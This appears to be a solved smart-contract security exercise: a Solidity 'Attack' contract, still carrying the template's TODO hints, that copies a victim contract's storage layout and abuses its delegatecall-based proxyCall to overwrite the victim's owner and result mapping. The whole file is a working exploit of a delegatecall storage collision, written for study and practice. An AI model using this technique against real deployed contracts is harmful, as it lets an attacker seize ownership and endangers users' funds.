// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract
	uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
	address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;
	address internal immutable victim;

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here
	function change(address msgSender) public{
		result[msgSender]=true;
		owner=msgSender;
	}

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
		address owner2=ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("change(address)",msg.sender));
		require(owner2==msg.sender, "QQ");
    }
}
